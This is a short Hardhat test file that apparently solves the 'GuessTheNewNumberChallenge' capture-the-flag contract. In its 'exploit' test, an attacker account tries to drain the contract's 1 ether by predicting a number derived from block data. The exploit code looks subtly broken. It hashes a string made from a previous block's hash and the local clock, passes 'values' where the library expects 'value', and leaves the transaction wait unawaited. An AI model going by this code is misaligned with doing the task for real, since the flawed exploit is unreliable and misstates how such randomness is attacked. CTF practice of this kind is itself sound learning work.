import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
import { keccak256 } from 'viem';
const { utils, provider } = ethers;

describe('GuessTheNewNumberChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheNewNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = await target.connect(attacker);
  });

  it('exploit', async () => {
    const currentBlockNumber = await provider.getBlockNumber();
    const blockNumber = await provider.getBlock(currentBlockNumber -1);
    const blockHash = blockNumber.hash;
    const timestamp = Math.floor(Date.now() / 1000);
    const answer =  keccak256(blockHash + timestamp);
    const tx = await target.connect(attacker).guess(answer, {values : utils.parseEther('1')});
    tx.wait();



    expect(await provider.getBalance(target.address)).to.equal(0);
  });
});
